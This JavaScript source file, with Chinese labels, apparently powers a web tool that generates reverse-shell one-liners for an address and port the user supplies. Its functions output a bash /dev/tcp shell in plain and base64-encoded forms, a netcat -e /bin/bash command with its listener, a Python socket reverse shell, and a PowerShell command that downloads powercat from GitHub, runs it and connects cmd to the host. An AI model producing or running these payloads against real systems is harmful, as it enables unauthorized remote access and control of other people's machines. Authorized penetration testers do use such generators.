function bash(){
	var addr = $('#addr').val();
	var port = $('#port').val();
	var taOutput = document.querySelector('textarea#st2');
	taOutput.value = '普通版本：bash -i >& /dev/tcp/'+addr+'/'+port+' 0>&1'+' 或 '+'bash -c '+'"'+'bash -i >& /dev/tcp/'+addr+'/'+port+' 0>&1'+'"'+'\n'+'编码版本：'+'bash -c {echo,' + btoa('bash -i >& /dev/tcp/'+addr+'/'+port+' 0>&1') + '}|{base64,-d}|{bash,-i}';
}

function nc(){
	var addr = $('#addr').val();
	var port = $('#port').val();
	var taOutput = document.querySelector('textarea#st2');
	taOutput.value = '测试执行: nc -lvvp '+port+'\n'+'目标执行: nc '+addr+' '+port+' -e /bin/bash';
	
}

function python(){
	var addr = $('#addr').val();
	var port = $('#port').val();
	var taOutput = document.querySelector('textarea#st2');
	taOutput.value = '测试执行: nc -lvvp '+port+'\n'+'目标执行: python -c '+'\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.soCK_STREAM);s.connect(('+'"'+addr+'"'+','+port+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'+'\'';	
}

function ps(){
	var addr = $('#addr').val();
	var port = $('#port').val();
	var taOutput = document.querySelector('textarea#st2');
	taOutput.value = 'powershell IEX (New-Object System.Net.Webclient).DownloadString ('+'\'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1\''+'); powercat -c ' +addr +' -p '+ port +' -e cmd';
}